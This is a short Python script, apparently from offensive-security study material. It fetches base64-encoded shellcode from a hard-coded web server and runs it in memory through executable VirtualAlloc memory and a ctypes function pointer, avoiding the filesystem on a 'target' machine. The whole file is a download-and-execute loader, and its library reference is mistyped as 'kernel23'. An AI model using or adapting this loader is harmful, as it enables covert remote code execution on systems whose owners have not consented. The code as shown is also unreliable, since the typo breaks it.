# Sometimes interacting with target we might need some form of shellcode exec
# To do so without touching the filesystem, requires a buffer in the memory 
# The buffer will hold the shellcode and, using ctypes, create a function pointer to that mem
# Then we just call the function

from urllib import request # to grab shellcode from webserver, in this case

import base64
import ctypes

kernel32 = ctypes.windll.kernel23

def get_code(url): # Retreive base64-encoded shellcode from webserver
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

def write_memory(buf): # Write code to mem
    length = len(buf)
    
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    # Create a virtual aloc 
    kernel32.RtlMoveMemory.argtypes = ( # 𝘵𝘩𝘦𝘯 move into allocated mem
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t
    )
    
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    # Specify that we want a pointer in return
    kernel32.RtlMoveMemory(ptr, buf, length)
    
    return ptr

def run(shellcode): 
    buffer = ctypes.create_string_buffer(shellcode)
    # Allocate buffer to hold decoded shellcode
    ptr = write_memory(buffer) 
    
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    # Allows cast the buffer to act like a function pointer
    shell_func() # Call function pointer
    
if __name__=='__main__':
    url = "http://192.168.1.203:8100/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)